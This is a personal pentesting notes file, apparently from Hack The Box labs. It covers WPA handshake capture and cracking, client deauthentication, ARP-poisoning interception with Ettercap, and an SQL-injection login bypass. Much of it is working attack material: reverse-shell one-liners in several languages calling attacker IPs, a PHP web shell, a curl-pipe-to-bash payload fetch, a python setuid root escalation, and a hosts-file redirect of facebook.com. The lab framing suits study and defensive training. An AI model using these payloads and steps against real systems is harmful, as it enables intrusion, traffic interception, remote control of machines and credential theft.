##Wifi PenTesting
aircrack-ng is required - available by apt install under Debian.

.B Steps 
$ airmon-ng check
$ airmon-ng check kill                 # kill all processes interfering with wlan0 : NetworkManager and wpa_supplicant
$ airmon-ng start wlan0                # disables wlan0 and installs a virtual device wlan0mon in monitor mode
$ airodump-ng wlan0mon --channel 11    # wlan0 will gather all wireless packets from all nearby APs

.B Restoring:
$ airmon-ng stop wlan0mon # will remove the temp virtual wlan0mon and re-enable wlan0
$ NetworkManager          # will re-enable network manager and wpa_supplicant. Alternative : $ service network-manager start

.B Tips:
https://www.aircrack-ng.org/doku.php?id=airodump-ng
My rtl8723be under Debian seems not to capture anything. 
You need a WiFi adapter capable to operate in monitor mode and you also need drivers (usually customized) that will make use of the monitor mode.

$ iw list         # will provide info about wlan0  including supported modes:
......
......
Supported interface modes:
                 * IBSS
                 * managed
                 * AP
                 * AP/VLAN
                 * monitor
                 * mesh point
                 * P2P-client
                 * P2P-GO
.......
.......

 
$ iwconfig                        # show info about current session of wlan - includes active mode (monitor/managed) 
$ ifconfig wlan0 down             # Brings down the wlan0 - required before setting any modes - it seems that when mode is managed this is ignored.
$ iwconfig wlan0 mode monitor     # Force wlan0 to be in monitor mode. I was expecting airodump-ng wlan0 to work
$ iwconfig wlan0mon mode monitor  # Forcing monitor mode - Shouldn't aircrack supposed to do that...? 
$ iwconfig wlan0 mode managed     # Should be this mode in order NetworkManager do it's job
$ ifconfig wlan0 up               # Bring wlan0 up
$ iw wlan0 set power_save off     # disables power save
$ alias stopwlan0monitor='ifconfig wlan0 down && sleep 1 && iwconfig wlan0 mode managed && sleep 1 && ifconfig wlan0 up && sleep 1 && NetworkManager'

$ nano /etc/NetworkManager/NetworkManager.conf                    # Tweaking network manager conf file
[keyfile]                                                         # Add this line and the next one in conf file
unmanaged-devices=interface-name:wlan0mon;interface-name:wlan1mon # with this tweak you don't need to kill networkmanager (untested)

https://forums.kali.org/showthread.php?22638-rtl8723be-wireless-driver-installation
http://www.aircrack-ng.org/doku.php?id=compat-wireless


.B Alternative approach that worked:
$ iwconfig              # managed mode, connected to my home wifi
$ airmon-ng check kill  # killing network manager
$ ifconfig wlan0 down   # bring down the wlan0
$ aireplay-ng -9 wlan0    # -9 is a short code for injection testing- It seems that automatically brings up wlan0 on monitor mode
Among other is get a message :
........
00:29:34  Injection is working!
........
APs info
..........

$ iwconfig
wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.467 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr=2347 B   Fragment thr:off
          Power Management:off

$ airodump-ng wlan0 --channel 11 # WORKED FINE - It seems that defining a channel works better. But it worked either without --channel
To restore use alias exitmonitor (see above)

##Capturing packets
Next we need to capture some packages by the desired router.
We need two terminal windows for this operation.

.B Terminal 1:
$ airodump-ng --channel 1 --bssid D0:60:8C:06:71:86 -w /home/gv/Desktop/ wlan0  # -w: write to /home/gv/Desktop/

.B Terminal 2:
You need to pick a client in order to kick him out of the rooter and force him to make a new handshake with the router.
$ aireplay-ng -0 1 -a <routermac> -c <clientmac> wlan0
$ aireplay-ng -0 1 -a D0:60:8C:06:71:86 -c 62:E3:27:80:03:3E wlan0
# You should see some info DeAuthentication of the client and reconnection

The job is finished if the message [ WPA handshake: D0:60:8C:06:71:86 appears on top of terminal 1
If this messaged is not shown, handshake is not capture and you need to keep kicking out the client.

Now that you have capture a handshake you can verify it with whireshark - open file - select the cap file and filter packets for eapol
You should see 4 messages = 4 way handshake. Sometimes, though that airodump claims that captured a handshake , you don't see 4 messages in wireshark. In this case you need to repeat the process.

##Cracking WPA Key
https://www.youtube.com/watch?v=CN61riNkmEU
Once you have a good .cap file with all 4 handshake messages you can attack (offline) to the cap file to decode the key.

$ aircrack-ng -a2 -b [router bssid] -w path/to/wordlist /path/to/capfile.cap  #Georgia skips -a2 (-a = attack mode, 2=WPA (1 is WEP))

.B More Tips:
alias startwlan0monitor='airmon-ng check kill && ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up && aireplay-ng -9 wlan0 && airodump-ng wlan0'

1. http://aircrack-ng.org/doku.php?id=aircrack-ng#other_tips

2. aircrack-ng -w firstlist.txt,secondlist.txt,thirdlist.txt wpa2.eapol.cap  #providing three different word list files

3. john --stdout --wordlist=specialrules.lst --rules | aircrack-ng -e test -a 2 -w - /root/capture/wpa.cap  #attack using john the ripper

4. tshark -r <input file name> -R "eapol || wlan.fc.type_subtype == 0x08" -w <output file name>  #isolate/extract eapol 4way handshake to a smaller file

5. grep -E '^.{8,63}$' < inputfile  #WPA passwords are 8 to 63 chars long. This grep will skip passwords <8 or >63 chars.

Is quite common that people does not change the default PSK (pre shared key). 
We need some dictionaries including default PSKeys for various routers.

## MITM / ARP POISONING
https://dotweak.com/2019/10/27/how-to-do-a-man-in-the-middle-attack-using-arp-poisoning-c1N3TGhyN21TNEtQUW9McURkYTY4dz09?fbclid=IwAR3pqyk49Bm4rTSmDOc1B14mVWuZuPsxTyGXSrIuFO5yjjfVbT0oVbF-Snk
A man-in-the-middle attack (MITM) is an attack where the attacker secretly relays and possibly alters the communications between 
two parties who believe they are directly communicating with each other. 
In this case, the victims think that they are communicating with each other, but in reality, the attacker is controlling the communication. 
A MITM attack can succeed only when the attacker impersonates each endpoint sufficiently well to satisfy their expectations.

.B Ettercap Tool
Now that Ettercap is already installed in your machine, we will tweak a little bit of the configuration file of Ettercap to optimize the results provided by the tool.

sudo nano /etc/ettercap/etter.conf
The ec_uid and ec_gid lines must be set to 0 in order for the program service to work on behalf of the superuser:

[privs]
ec_uid = 0 # nobody is the default
ec_gid = 0 # nobody is the default

Then you need to find and uncomment these two lines:
redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

Above line try to handle http as simple http. Be warned, all web sites that have provided a certificate will not be available (certificate error)

The program can work in several modes - with a graphical interface, without and as a service. We will consider work in the graphical interface. To run a program with a GTK interface, use the -G option:

sudo -E ettercap -G
We use the -E option for sudo to save all of our user's environment variables.

.B ARP poisoning Attack using Ettercap

This attack anatomy allows us to force the target computer to send packets to us instead to send it to the router.

Let us get to the point and execute the Ettercap ARP Poisoning Attack In Ettercap, click on the Sniff > Unified Sniffing and in the new popup select your network interface referenced in the below screenshot by wlp2s0.
It's now the time to scan the network and list the devices currently connected. In order to do it, simply click the hosts > scan for hosts. It will start scanning the whole network for the alive hosts. Once the scan is done, click again the hosts > hosts list to see the list of the hosts available in the network.

.I Important: 
This list also includes the default gateway address so we have to be careful when we select the targets

We will select the targets from our list of hosts. In a MITM attack, the attacker intercepts the network and sniffs the packets. 
In our man-in-the-middle scenario, our target machine is 192.168.1.104 and our router is 192.168.1.1. 
In Ettercap, just click to target 1 (192.168.1.104) and select (right click) add to target 1. 
Repeat the same with target 2 and select add to target 2.

click the Mitm > ARP poisoning and click OK. Thereafter, check the option Sniff remote connections and click OK.

Click start > start sniffing. This will start ARP poisoning in the network which means we have enabled our network card in promiscuous mode and now the local traffic can be sniffed.

Note: We have allowed only HTTP sniffing with Ettercap, so don’t expect HTTPS packets to be sniffed with this process. From this simple example, if our victim logged into some websites we will get the output into our Ettercap console.

The program is now sending packets to the network, with a request for 192.168.1.104 to update the ARP cache and replace the MAC address 
of the router with yours. The attack is started and successfully executed. 
You can open the View -> Connections menu and see the active connections for the target device.

If a packet is sent through the network without encryption method, then we can view the transmitted information by clicking on the connection row. 
The informations sent are displayed on the left side, and the informations received are displayed on the right.

Any sensitive information, such as the data passed through a login form, a registration form, a contact form, etc ... as long they are not 
encrypted, can be parsed by the attacker examining the content of every rows and them values.

## WEB SITE EXPLOIT 
Source: Hack the Box
We are dealing with a web server that listens on typical port 80, and when you visit this port you arrive at web servers login page and you are prompted for username and password.

.B GOBUSTER Tool
Gobuster is one tool used to brute force directories on a webserver through a specially made list of variables known as the wordlist 
in an attempt to guess the correct input for it to be validated and access to be gained. 

GoBuster can be found available in Debian Repos (apt install gobuster) and is written in GoLang. 

If gobuster is not available in your distro repos then you can do something like bellow alternatives:
 
.I go install github.com/OJ/gobuster/v3@latest
ps: You need to have Go installed

.I Building from source code and compiling
source : Hack The Box

.I By git clone:
git clone https://github.com/OJ/gobuster.git

After cloning there will be a gobuster folder in the directory you are currently in. 
The gobuster has external dependencies, and so they need to be pulled in first:
    go get 
    go build #This will create a gobuster binary for you. 

If you want to install it in the $GOPATH/bin folder, you can run:
    go install

If you have all the dependencies already, you can make use of the build scripts:
make - builds for the current Go configuration (i.e., runs go build ).
make windows - builds 32 and 64-bit binaries for Windows and writes them to the build folder.
make linux - builds 32 and 64-bit binaries for Linux and writes them to the build folder.
make darwin - builds 32 and 64-bit binaries for Darwin and writes them to the build folder.
make all - builds for all platforms and architectures, and writes the resulting binaries to the build folder.
make clean - clears out the build folder.
make test - runs the tests.

.I Using Gobuster
In order to use GoBuster we need a wordlist. 
There is a dedicated folder with a myriad of wordlists, dictionaries, and rainbow tables that comes pre-installed with Parrot OS, found under the path /usr/share/wordlists .

To download this list (if not available in your distro):
    git clone https://github.com/danielmiessler/SecLists.git

Now we can ue GoBuster with the following options:
.SY GoBuster_Options:
dir			: Specify that we wish to do web directory enumeration.
--url		: Specify the web address of the target machine that runs the HTTP server.
--wordlist	: Specify the wordlist that we want to use.
.YS

Typical usage:
.RS 
gobuster dir --url http://{targetIP}/ --wordlist {wordlist-directory}/directory-list-2.3-small.txt
gobuster dir --url http://10.129.236.49 --wordlist /home/gv/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

.B Default Credentials
Since GoBuster did not find anything usefull that can be exploitable, we can try the most common combinations in the username and password fields, such as:
admin:admin
guest:guest
user:user
root:root
administrator:password

No success. 
We could, hypothetically, use a tool to attempt brute-forcing the log-in page. 
However, that would take much time and might trigger a security measure.

## SQL Injection
SQL Injection is a common way of exploiting web pages that use `SQL Statements` that
retrieve and store user input data. If configured incorrectly, one can use this attack
to exploit the well-known `SQL Injection` vulnerability, which is very dangerous. There
are many different techniques of protecting from SQL injections, some of them being
input validation, parameterized queries, stored procedures, and implementing a WAF (Web
Application Firewall) on the perimeter of the server's network. However, instances can
be found where none of these fixes are in place, hence why this type of attack is
prevalent, according to the [OWASP Top 10](https://owasp.org/www-project-top-ten/) list
of web vulnerabilities.

.B SQL authentication using PHP & SQL:
This is a sample of vulnerable PHP Code that deals with SQL. Our "HTB machine" is equipped with a similar code. 

.RS 
<?php
mysql_connect("localhost", "db_username", "db_password"); # Connection to the SQL Database.
mysql_select_db("users"); # Database table where user information is stored.
$username=$_POST['username']; # User-specified username.
$password=$_POST['password']; #User-specified password.
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
# Query for user/pass retrieval from the DB.
$result=mysql_query($sql);
# Performs query stored in $sql and stores it in $result.
$count=mysql_num_rows($result);
# Sets the $count variable to the number of rows stored in $result.

if ($count==1){
# Checks if there's at least 1 result, and if yes:
$_SESSION['username'] = $username; # Creates a session with the specified $username.
$_SESSION['password'] = $password; # Creates a session with the specified $password.
header("location:home.php"); # Redirect to homepage.
}
else { 
# If there's no singular result of a user/pass combination:
header("location:login.php");
# No redirection, as the login failed in the case the $count variable is not equal to 1, HTTP Response code 200 OK.
}
?>

.RE

.B Explanation of the vulnerability

This code above is vulnerable to SQL Injection attacks, where you can modify the query (the $sql variable)
through the log-in form on the web page to make the query do something that is not supposed to do - bypass the log-in altogether!

In our case, since it seems that web server is not making any kind of login page input data validation, we can provide the following username:
admin '#

The ['] char after admin will forcibly close the sql query and the [#] char will make everything after 'admin' to be a comment.
As a result, the password checking is skipped since it is commented out. 
You can provide even "a" as password - no worries , it will be commented out by the #.

If we look further down in the PHP code above, we will see that the code will only approve the log-in once there is precisely one result 
of our username and password combination. However, since we have skipped the password search part of our query, the script will now
only search if any entry exists with the username admin . In this case, we got lucky. 
There is indeed an account called admin , which will validate our SQL Injection and return the 1 value for the $count variable,
which will be put through the if statement , allowing us to log-in without knowing the password. 
If there was no admin account, we could try any other accounts until we found one that existed. ( administrator, root, john_doe, etc.) 
Any valid, existing username would make our SQL Injection work.

More presisely the sql query search using username = admin'# 
will be like this:

SELECT * FROM users WHERE username='admin'# AND password='a' 
which in reality is translated to this due to # (comment) char:
SELECT * FROM users WHERE username='admin'

Tip: There is a kind of trick like 1=1 which it has been said to work pretty well and returns the whole database. We should check it.

##REVERSE SHELL
Sources:
Hack The Box , courses "three" and "Cap"
https://ioflood.com/blog/bash-reverse-shell/
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Concept of reverse shell is that instead of attacker / pen tester to try to get connected to target, you open a listening shell in your
pc (attacker pc) and the target is forced to get connected to attacker shell using reverse shell.

Actually on the target machine you invoke an interactive shell in which stdout , stderr and stdin are bind to the attacker tcp address / tcp port.

On the target machine you have to use (actually inject) this command:
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/<yourport> 0>&1  #equivalent: bash -i &> /dev/tcp/attacker-ip/4444 <&1

Explanation:
bash -i : run a bash interactive instance
&>: redirect both stdout / stderr - can be also written as >& 
/dev/tcp/<ip>/<port> : tcp socket that bash -i will redirect data (stderr / stdout)
<&1 : Can be written as 0<&1 or even 0>&1 : will attach stdinput (fd 0) of "bash -i" to the tcp tunnel.


You can create a simple shell script containing only the above command and find a way to upload this sh file to the victim's machine or web site.
See Hack-The-Box Tutorial of chapter 1.5 (Three) for tutorial about uploading a php script to web server root directory.

.B Reverse Shell Step by Step Example (using the same machine)
1. Terminal 1 (attacker) -> go to any folder.
Example:
$ pwd
/home/gv/Desktop/PythonTests

2. Terminal 2 (victim) -> go to a folder different than terminal 1.
Example:
root@sambadeb:~# pwd
/root

3. On terminal 1 (attacker) use netcat to listen for connections from target shell:
nc -nlvp 4444

4. On terminal 2 (target) invoke an interactive shell that will be binded to /dev/tcp/attacker-ip/port of Terminal 1
bash -i >& /dev/tcp/192.168.2.16/4444 0>&1

5. Now, observe terminal 1 :
gv@sambadeb:~/Desktop/PythonTests$ nc -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.2.16.
Ncat: Connection from 192.168.2.16:53620.
root@sambadeb:/home/gv# 

As you can see in the last line, the "listening" shell at Terminal 1 has been connected to Terminal 2 shell
Whatever you type in this Terminal 1 (attacker shell) is actually executed (but not typed) on Terminal 2 (target) - try a simple ls .
Keep in mind that permissions of Terminal 2 are retained; reverse shell does not magically grants root access. 
In my example we have root permissions at Terminal 1 (when Terminal 2 got's connected) because we had already root priveleges on Terminal 2 before invoking the reverse shell.

.B Alternative Ways to get a reverse shell
Source: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Directly with netcat if -e switch is supported:
    nc -e /bin/sh 10.0.0.1 1234

Perl:
    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

PHP:
    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby:
    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Java:
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

## Command Injection: Forcing Target PC to execute a command like reverse shell , etc

Usually you can not directly copy-paste your scripts to the target due to access denied errors.
Though, a weak ftp / ssh password on target pc might grant you shell access in some cases, but again direct copying and executing scripts in target is not the best.

The trick to execute commands in target is to use (on attacker machine) python instant web server module like this:
    python3 -m http.server 8000

tip1: You need to run python http server on the same directory that your scripts are located.
Actually http.server of python is serving your cwd.

tip2: Target machine and attacker machine should be able to communicate (via ovpn, via internet , etc)

On the target machine you can use something like that:
    curl attackerip:port/script.sh | bash

tip: for more details on this technique see HackTheBox - cap.pdf

.B Using php to execute shell commands.
In this condition direct access to target shell (i.e via ssh) is not possible but you know that target is running a web server and php is available.
Depending on the web server configuration you might be able to inject a php script file in web server directory.
On document HTB-1-5.pdf (Three) a technique of uploading a php script to target web directory is explained if target is using aws s3 bucket.

So , you can make a php file like this:
    echo '<?php system($_GET["cmd"]); ?>' > shell.php

You upload this shell.php to target web server directory (aws s3 bucket) and you can now call this script from your browser (attacker pc):
    http://targetwebservet/shell.php?cmd=id

The response from the web server in our browser contains the output of the linux command "id" , which verified that we have code execution on the box.
Since we have code execution available we can also invoke a reverse shell by the box (target) to us (attacker machine).

1. Create a new file shell.sh containing the following bash reverse shell payload
        #!/bin/bash
        bash -i >& /dev/tcp/attacker_IP/4444 0>&1

2. on our machine (attacker) start ncat listener on our local port 4444 using the following command.
        nc -nvlp 4444

3. Start a python web server on the same directory that your reverse shell file is located:
        python3 -m http.server 8000
        
4. Use curl to fetch the bash reverse shell file from our local -attacker- machine and pipe it to target's bash
        http://targetwebserver/shell.php?cmd=curl%20attackerIP:8000/shell.sh |bash
        
5. Now in your shell (attacker machine) you are able to browse / navigate to the target directories using shell commands (ls, cd, cat, etc) 

.B Use python to gain root access
Scenario: You have non-privileged (user) access to target shell through exploited weak ssh password captured by WireShark.

Tool:
There is a shell script that can "scan" the target machine for known vulnerabilities called "linPEAS.sh"
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

1. get and save this linPEAS script in your machine (attacker):
        curl -L -O https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

2. invoke a python web server to "serve" this linpeas.sh to the target
        python3 -m http.server 8000

3. On target shell run the linpeas.sh:
        curl http://attackerip:port/linpeas.sh | bash

4. If linpeas claims that Python is vulnerable / misconfigured like bellow:
        /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

As explained by Hack The Box - Cap.pdf:
The /usr/bin/python3.8 is found to have cap_setuid and cap_net_bind_service , which isn't the default setting.
According to the documentation, CAP_SETUID allows the process to gain setuid privileges without the SUID bit set. 
The developer of Cap must have given Python this capability to enable the site to capture traffic, which a non-root user can't do.

5. Lets switch to UID 0 (root) with bellow python commands entered in a python3 interactive shell: 
    import os
    os.setuid(0)
    os.system("/bin/bash")

6. python3 shell will exit and you will end up in target bash shell with root access!

## NMAP TOOL
nmap stands for "Network Mapper" - It is actually a lan scanning utility.
nmap is used as #1 tool for network analysis and vulnerability testing.
    apt install nmap
nmap is used widely to scan targets (one ip, ip range, multiple ips) and detect open ports and running services.


.B NMAP options and switches
.RS
-sC             : Performs a script scan using the default set of scripts / service detection scripts
-sV             : Probe open ports to determine service version info running in each port (i.e version of openvpn, version of ssh, etc)
-p              : Define single port, multiple ports (comma seperated), port <range>. If not provided typical ports will be scanned.
                  Use -p- to scan all ports from 1 through 65535.

-Pn             : Treat host as online -- skip ping & host discovery
-sL             : List Scan - simply list targets to scan
-sn             : Ping Scan - disable port scan (enabled by default in nmap - usefull for active nodes discovery in the lan).
                  Since ping tool can ping only one host at the time, combining nmap with ip range and -sn can ping multiple hosts automatically.
-S <IP_Address> : Spoof source address
-sU             : UDP Scan
-v              : Verbose - can be used like -v3 to increase verbosity level to 3.
-n              : No DNS resolution (nmap makes dns resolution of IP by default)

-O              : OS Detection
-A              : Enable OS detection, version detection, script scanning, and traceroute 
-T4             : Faster Execution

##CURL TOOL
curl is used to "fetch" a web page . Actually is used to transfer "url" FROM or even TO the server.

.B CURL Interesting Options
.RS
curl -D /dev/stdout 10.10.11.221        Prints to file (/dev/stdout in my example = screen) the response headers from host/url provided.
curl -i 10.10.11.221                    Same as above, print on screen by default.
curl -L                                 Follow web page redirection and make a new curl to this redirected page.
curl -s                                 Silent operation - print on screen less details about "curling".
curl -o                                 Specify output file

##Linux Host file
Each Linux machine is equipped with file /etc/hosts
This file holds locally DNS entries. 
The important thing to remember is that linux first check for entries this file and if an entry is not found then the network manager dns servers are queried. 

.B Format of /etc/hosts
.RS
127.0.0.1	localhost
127.0.1.1	sambadeb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
.RE

Tip1 : It is common for security reasons some web pages to "redirect" html from one ip to a hostname. We can see this in HTB machines quite often.
As a result if the domain name is not a registered domain name to be found on public dns servers, your web browser will fail to follow the html redirection.

You can though modify your /etc/hosts file to bind a certain ip to a dedicated domain name.
.I Example: 
    echo '10.10.10.11 2million.htb' | sudo tee -a /etc/hosts

Tip2 : Obviously, this feature is also a great security risk. If you succeed to "edit" this /etc/hosts file in a remote machine you can inject
malicious entries to redirect well known pages to a certain IP different than the "official" registered IP.
For example : echo 'my-machine-ip facebook.com' | sudo tee -a /etc/hosts 
With this entry you resolve www.facebook.com to your 'machine-ip'.




##How to manually send HTTP POST requests from Firefox or Chrome browser
    curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq

Make an AJAX call in the Chrome console. No extension needed. This is a good way to make POST requests without the need to grab authentication cookies. 
    $.post('/resource/path/')

curl -X POST http://2million.htb/api/v1/invite/generate | jq --> provides encoded invite code - use |base64 -d to decode the invite code.
